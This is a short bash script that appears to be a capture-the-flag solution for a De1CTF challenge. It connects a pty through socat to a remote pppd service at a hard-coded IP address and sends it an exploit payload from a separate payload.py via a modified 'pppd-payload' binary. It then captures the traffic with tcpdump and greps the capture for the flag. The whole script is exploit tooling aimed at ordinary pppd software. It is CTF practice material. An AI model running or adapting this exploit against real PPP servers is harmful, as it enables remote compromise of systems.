#!/bin/bash

[ $(id -u) != 0 ] && echo "Please run this script as root." && exit

## generate payload
python3 payload.py > /dev/null

## create a pty device that communicates to the remote pppd
socat -d -d pty,link=/tmp/ppp,echo=0,raw tcp:134.175.208.201:8848 &

## record the network traffic
tcpdump -w out.pcap tcp and host 134.175.208.201 &

## send payload to the remote pppd via pty
sleep 3
./pppd-payload noauth local defaultroute debug nodetach /tmp/ppp user admin password 1234568

## clean up
sleep 3
killall socat
killall tcpdump

## search flag in recorded traffic
sleep 3
echo "---------------------------------------------------------"
strings out.pcap | grep De1CTF 

rm out.pcap
rm /tmp/sc


